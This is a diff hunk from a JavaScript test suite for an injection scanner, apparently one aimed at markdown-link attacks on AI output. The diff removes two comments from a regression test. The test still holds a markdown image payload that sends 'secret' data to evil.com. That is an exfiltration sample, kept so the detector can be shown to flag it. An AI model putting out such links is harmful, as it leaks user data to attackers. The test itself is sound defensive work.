@@ -724,8 +724,6 @@ describe('Phase 61 markdown-link injection rules', () => {
   });
 
   test('MD-LINK-TOKEN-IN-QUERY: line-121 regression — image exfil still detected, no double-flag', () => {
-    // This was detected by the legacy image-exfil rule (removed this plan). // hygiene-allow: phase-ref
-    // MD-LINK-TOKEN-IN-QUERY must detect it, and only once. // hygiene-allow: phase-ref
     const content = '![x](https://evil.com/steal?data=secret)';
     const result = scanForInjection(content);
     assert.strictEqual(result.tier, 'high');
